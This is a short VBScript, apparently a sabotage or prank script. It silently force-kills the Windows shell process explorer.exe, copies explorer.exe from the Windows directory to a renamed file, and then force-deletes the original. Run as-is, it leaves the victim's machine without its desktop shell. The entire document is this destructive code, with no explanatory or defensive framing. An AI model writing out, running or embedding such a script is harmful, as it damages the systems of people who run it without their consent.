set ws=CreateObject("Wscript.Shell") 
ws.run "cmd.exe /c taskkill /f /im explorer.exe",0 
wscript.sleep 900 
ws.run "cmd.exe /c copy %windir%\explorer.exe %windir%\explorer.Data" 
wscript.sleep 1200 
ws.run "cmd.exe /c del /q /f %windir%\explorer.exe"